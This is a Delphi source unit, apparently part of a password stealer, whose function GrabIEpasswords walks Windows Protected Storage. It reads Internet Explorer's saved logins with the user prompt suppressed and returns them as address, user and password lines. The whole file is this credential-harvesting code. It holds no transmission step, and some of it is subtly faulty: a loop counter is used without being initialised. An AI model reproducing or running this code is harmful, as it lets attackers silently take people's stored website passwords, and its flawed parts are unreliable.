Unit IEpasswords;

interface

uses
  windows,
  PSTORECLib_TLB,
  pstoreclib;

function GrabIEpasswords: string;

implementation

type
  TProviderInfo = record
    GUID: TGUID;
    Capabilities: LongWord;
    ProviderName: ShortString;
  end;
  PProviderInfo = ^TProviderInfo;

var
  FProvider: IPStore;
  ProviderID: PGUID;

function Item_Data(FProvider: IPStore; GUID_Type: TGUID; GUID_SubType: TGUID; Item_Name: PWideChar): string;
var
  DimData: Cardinal;
  Data: PByte1;
  pstpi: _PST_PROMPTINFO;
  i: Cardinal;
  StringaDati: string;
begin
  DimData := 0;
  Data := nil;

  pstpi.cbSize := SizeOf(_PST_PROMPTINFO);
  pstpi.dwPromptFlags := 4;
  pstpi.hwndApp := 0;
  pstpi.szPrompt := '';

  FProvider.ReadItem(0, GUID_Type, GUID_SubType, StringToOleStr(Item_Name), DimData, Data, pstpi, 0);

  while i < DimData do
    begin
      if (PByte(Integer(Data) + i)^ < $20) or (PByte(Integer(Data) + i)^ > $7F) then
        StringaDati := StringaDati + '*'
      else
        StringaDati := StringaDati + pChar(Integer(Data) + i)^;
      Inc(i, 2);
    end;

  CoTaskMemFree(Data);

  Result := StringaDati;
end;

function SubType_Name(pType, pSubType: TGUID): string;
var
  pst: PUserType3;
begin
  pst := nil;
  FProvider.GetSubtypeInfo(0, pType, pSubType, pst, 0);
  Result := String(pst^.szDisplayName);
  CoTaskMemFree(pst);
end;

function Type_Name(pType: TGUID): string;
var
  pst: PUserType3;
begin
  pst := nil;
  FProvider.GetTypeInfo(0, pType, pst, 0);
  Result := String(pst^.szDisplayName);
  CoTaskMemFree(pst);
end;

function ElencoItems(FProvider: IPStore; GUID_Type: TGUID; GUID_SubType: TGUID): string;
var
  ppEnumItems: IEnumPStoreItems;
  NroElementiRestituiti: Cardinal;
  Item_Name: PWideChar;
begin
  result := '';
  FProvider.EnumItems(0, GUID_Type, GUID_SubType, 0, ppEnumItems);
  NroElementiRestituiti := 0;
  repeat
    ppEnumItems.Next(1, Item_Name, NroElementiRestituiti);
    if NroElementiRestituiti > 0 then
      begin
        Result := Result + String(Item_Name) + #13#10;
        Result := Result + Item_Data(FProvider, GUID_Type, GUID_SubType, Item_Name) + #13#10;
      end;
  until NroElementiRestituiti = 0;
end;

function StringFromCLSID(const clsid: TGUID; out psz: PWideChar): HResult; stdcall;
  external 'ole32.dll' name 'StringFromCLSID';

function GUIDToString(const GUID: TGUID): string;
var
  P: PWideChar;
begin
  Succeeded(StringFromCLSID(GUID, P));
  Result := P;
  CoTaskMemFree(P);
end;

function ElencoSubTypes(FProvider: IPStore; GUID_Type: TGUID): string;
var
  ppEnumSubTypes: IEnumPStoreTypes;
  NroElementiRestituiti: Cardinal;
  GUID_SubType: TGUID;
begin
  Result := '';
  FProvider.EnumSubTypes(0, GUID_Type, 0, ppEnumSubTypes);
  NroElementiRestituiti := 0;
  repeat
    ppEnumSubTypes.Next(1, GUID_SubType, NroElementiRestituiti);
    if NroElementiRestituiti > 0 then
      begin
        Result := Result + GUIDToString(GUID_SubType) + '---' + SubType_Name(GUID_Type, GUID_SubType) + #13#10;
        Result := Result + ElencoItems(FProvider, GUID_Type, GUID_SubType) + #13#10;
      end;
  until NroElementiRestituiti = 0;
end;

function ElencoTypes(FProvider: IPStore): string;
var
  ppEnumTypes: IEnumPStoreTypes;
  NroElementiRestituiti: Cardinal;
  GUID_Type: TGUID;
begin
  Result := '';
  FProvider.EnumTypes(0, 0, ppEnumTypes);
  NroElementiRestituiti := 0;
  repeat
    ppEnumTypes.Next(1, GUID_Type, NroElementiRestituiti);
    if NroElementiRestituiti > 0 then
      begin
        Result := Result + GUIDToString(GUID_Type)+ '---' + Type_Name(GUID_Type) + #13#10;
        Result := Result + ElencoSubTypes(FProvider, GUID_Type) + #13#10;
      end;
  until NroElementiRestituiti = 0;
end;

function ProviderInfo(FProvider: IPStore): string;
var
  ppInfo: PUserType1;
begin
  FProvider.GetInfo(ppInfo);
  result := ppInfo.szProviderName;
end;

function GrabIEpasswords: string;
var
  TempStr, TempStr1: string;
  Address, User, Pass: string;
begin
  result := '';
  PStoreCreateInstance(FProvider, ProviderID, nil, 0);
  ProviderInfo(FProvider);
  TempStr := ElencoTypes(FProvider);
  if Tempstr = '' then exit;
  while pos(#13#10, Tempstr) > 0 do
  begin
    Tempstr1 := Copy(Tempstr, 1, pos(#13#10, Tempstr) - 1);
    if pos(':StringData', Tempstr1) > 0 then
    begin
      Address := copy(Tempstr, 1, pos(':StringData', Tempstr1) - 1) + ' |';
      delete(Tempstr, 1, pos(#13#10, Tempstr) + 1);
      Tempstr1 := copy(Tempstr, 1, pos(#13#10, Tempstr) - 1);
      delete(Tempstr, 1, pos(#13#10, Tempstr) + 1);
      if pos('*', Tempstr1) > 0 then
      while pos('*', Tempstr1) > 0 do
      begin
        User := copy(Tempstr1, 1, pos('*', Tempstr1) - 1) + ' |';
        delete(Tempstr1, 1, pos('*', Tempstr1));
        Pass := copy(Tempstr1, 1, pos('*', Tempstr1) - 1) + ' |';
        Delete(Tempstr1, 1, pos('*', Tempstr1));
        if (user <> '') and (Pass <> '') then
        Result := Result + Address + User + ' |' + Pass + ' |' + #13#10;
      end;
    end else
    Delete(Tempstr, 1, pos(#13#10, Tempstr) + 1);
  end;
end;

end.